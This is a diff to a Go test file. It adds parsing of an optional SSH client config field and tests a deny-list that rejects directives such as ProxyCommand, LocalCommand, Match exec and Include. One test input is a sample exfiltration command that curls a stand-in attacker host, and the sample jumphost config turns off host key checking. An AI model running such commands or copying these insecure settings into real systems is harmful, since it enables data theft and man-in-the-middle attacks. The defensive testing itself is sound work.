@@ -9,6 +9,25 @@ import (
 	. "github.com/onsi/gomega"
 )
 
+const jumphostSSHConfig = `Host bastion
+  HostName bastion.example.com
+  User jump
+  Port 22
+  IdentityFile /tmp/master_key
+  IdentitiesOnly yes
+  PubkeyAuthentication yes
+  PreferredAuthentications publickey
+  StrictHostKeyChecking no
+  UserKnownHostsFile /dev/null
+  GlobalKnownHostsFile /dev/null
+  BatchMode yes
+  ConnectTimeout 30
+  ConnectionAttempts 1
+  ServerAliveInterval 30
+  ServerAliveCountMax 3
+Host target
+  ProxyJump bastion`
+
 var _ = Describe("Host Configuration Parsing and Validation Tests", func() {
 
 	// This section tests the parsePlatformList helper function
@@ -528,6 +547,7 @@ var _ = Describe("Host Configuration Parsing and Validation Tests", func() {
 					Expect(hostConfig.Platform).Should(Equal(expectedPlatform))
 					Expect(hostConfig.Secret).Should(Equal(expectedSecret))
 					Expect(hostConfig.Concurrency).Should(Equal(expectedConcurrency))
+					Expect(hostConfig.SSHConfig).Should(BeEmpty())
 				},
 				Entry("with all fields",
 					map[string]string{},
@@ -541,6 +561,30 @@ var _ = Describe("Host Configuration Parsing and Validation Tests", func() {
 					map[string]string{"concurrency": ""},
 					"127.0.0.1", "root", "linux/s390x", "test-s390x-static-secret", 0,
 				),
+			)
+		})
+
+		When("parsing the optional ssh-config field", func() {
+			DescribeTable("should keep SSH client config text or treat the field as unset",
+				func(value, expected string) {
+					data := map[string]string{
+						"host.moshe-kipod-s390x-static.address":     "127.0.0.1",
+						"host.moshe-kipod-s390x-static.user":        "root",
+						"host.moshe-kipod-s390x-static.platform":    "linux/s390x",
+						"host.moshe-kipod-s390x-static.secret":      "test-s390x-static-secret",
+						"host.moshe-kipod-s390x-static.concurrency": "4",
+						"host.moshe-kipod-s390x-static.ssh-config":  value,
+					}
+					hostConfig, err := ParseStaticHostConfig(data, "moshe-kipod-s390x-static")
+					Expect(err).ShouldNot(HaveOccurred())
+					Expect(hostConfig.SSHConfig).Should(Equal(expected))
+				},
+				Entry("when the field is empty", "", ""),
+				Entry("when the field is whitespace", "   ", ""),
+				Entry("when the field contains an SSH client config", "  Host *\n  ProxyJump bastion.example.com\n", "Host *\n  ProxyJump bastion.example.com"),
+				Entry("when a comment mentions a rejected directive", "# ProxyCommand is documented only\nHost *\n  ProxyJump bastion\n", "# ProxyCommand is documented only\nHost *\n  ProxyJump bastion"),
+				Entry("when a quoted allowed directive is unwrapped", "\"ProxyJump\" bastion.example.com\n", "\"ProxyJump\" bastion.example.com"),
+				Entry("when the field is a jumphost client config", jumphostSSHConfig+"\n", jumphostSSHConfig),
 			)
 		})
 
@@ -586,6 +630,62 @@ var _ = Describe("Host Configuration Parsing and Validation Tests", func() {
 				Entry("for IBM platform with invalid secret",
 					map[string]string{"secret": "invalid-secret"},
 					"invalid secret 'invalid-secret'",
+				),
+				Entry("for ssh-config with ProxyCommand",
+					map[string]string{"ssh-config": "Host *\n  ProxyCommand ssh bastion -W %h:%p\n"},
+					`ssh-config directive "proxycommand" is not allowed`,
+				),
+				Entry("for ssh-config with a quoted ProxyCommand",
+					map[string]string{"ssh-config": "\"ProxyCommand\" ssh bastion -W %h:%p\n"},
+					`ssh-config directive "proxycommand" is not allowed`,
+				),
+				Entry("for ssh-config with ProxyCommand in keyword=value form",
+					map[string]string{"ssh-config": "ProxyCommand=ssh bastion -W %h:%p\n"},
+					`ssh-config directive "proxycommand" is not allowed`,
+				),
+				Entry("for ssh-config with LocalCommand",
+					map[string]string{"ssh-config": "Host *\n  LocalCommand echo hi\n"},
+					`ssh-config directive "localcommand" is not allowed`,
+				),
+				Entry("for ssh-config with PermitLocalCommand",
+					map[string]string{"ssh-config": "Host *\n  PermitLocalCommand yes\n"},
+					`ssh-config directive "permitlocalcommand" is not allowed`,
+				),
+				Entry("for ssh-config with Match exec",
+					map[string]string{"ssh-config": "Match exec \"curl http://attacker/exfil\"\n"},
+					`ssh-config directive "match" is not allowed`,
+				),
+				Entry("for ssh-config with Match host",
+					map[string]string{"ssh-config": "Match host *.example.com\n  ProxyJump bastion\n"},
+					`ssh-config directive "match" is not allowed`,
+				),
+				Entry("for ssh-config with KnownHostsCommand",
+					map[string]string{"ssh-config": "Host *\n  KnownHostsCommand /usr/bin/true\n"},
+					`ssh-config directive "knownhostscommand" is not allowed`,
+				),
+				Entry("for ssh-config with Include",
+					map[string]string{"ssh-config": "Include /tmp/extra-ssh-config\n"},
+					`ssh-config directive "include" is not allowed`,
+				),
+				Entry("for ssh-config with PKCS11Provider",
+					map[string]string{"ssh-config": "Host *\n  PKCS11Provider /usr/lib/pkcs11.so\n"},
+					`ssh-config directive "pkcs11provider" is not allowed`,
+				),
+				Entry("for ssh-config with SecurityKeyProvider",
+					map[string]string{"ssh-config": "Host *\n  SecurityKeyProvider /usr/lib/sk-lib.so\n"},
+					`ssh-config directive "securitykeyprovider" is not allowed`,
+				),
+				Entry("for ssh-config with a port forward",
+					map[string]string{"ssh-config": "Host *\n  LocalForward 8080 localhost:8080\n"},
+					`ssh-config directive "localforward" is not allowed`,
+				),
+				Entry("for ssh-config with an escaped directive",
+					map[string]string{"ssh-config": "Proxy\\Command ssh bastion -W %h:%p\n"},
+					`ssh-config directive "Proxy\\Command" is not allowed`,
+				),
+				Entry("for ssh-config with an unclosed quote",
+					map[string]string{"ssh-config": "\"ProxyJump bastion.example.com\n"},
+					`ssh-config directive "\"ProxyJump" is not allowed`,
 				),
 			)
 		})
